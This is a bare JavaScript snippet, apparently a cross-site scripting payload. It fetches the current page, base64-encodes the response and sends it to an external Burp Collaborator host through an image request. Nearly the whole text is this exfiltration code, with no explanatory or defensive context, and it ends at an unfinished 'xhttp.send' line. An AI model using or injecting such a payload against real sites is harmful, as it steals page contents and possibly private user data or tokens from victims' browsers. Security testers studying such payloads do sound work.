var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      //var xhttp1 = new XMLHttpRequest();
      (new Image()).src= "https://e8n5wqznm2fytph1etkluhtcw32vqk.burpcollaborator.net?"+btoa(this.responseText)
      ///xhttp1.send()

    }
  };
  xhttp.open("GET", "./", true);
  xhttp.send
